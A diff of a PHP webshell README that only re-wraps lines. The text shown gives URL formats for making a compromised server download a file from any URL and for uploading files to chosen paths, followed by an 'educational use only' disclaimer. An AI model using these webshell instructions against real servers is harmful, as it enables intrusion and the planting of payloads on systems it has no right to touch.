@@ -33,7 +33,8 @@ To download a file from a URL and save it on the target system, use the followin
 
 http://target.com/path/cmd.php?download=[URL]&filename=[FILENAME]
 
-Replace [URL] with the URL of the file you want to download, and [FILENAME] with the desired name for the saved file on the target system.
+Replace [URL] with the URL of the file you want to download, 
+and [FILENAME] with the desired name for the saved file on the target system.
 ```
 ## Upload a file
 To upload a file to the target system, use the following URL format:
@@ -42,7 +43,8 @@ To upload a file to the target system, use the following URL format:
 http://target.com/path/cmd.php?upload&filepath=[FILE_PATH]
 
 Replace [FILE_PATH] with the desired file path for the uploaded file on the target system. 
-Use an HTTP POST request to send the file with the Content-Type header set to multipart/form-data and the file parameter named "file".
+Use an HTTP POST request to send the file with the Content-Type 
+header set to multipart/form-data and the file parameter named "file".
 ```
 ## Disclaimer
 This PHP webshell script is intended for educational purposes and ethical use only. Unauthorized use of this script may be illegal and unethical. Always make sure you have permission to perform any action on the target system and follow ethical hacking principles and guidelines. The author and any contributors are not responsible for any damage caused by unauthorized use of this script.
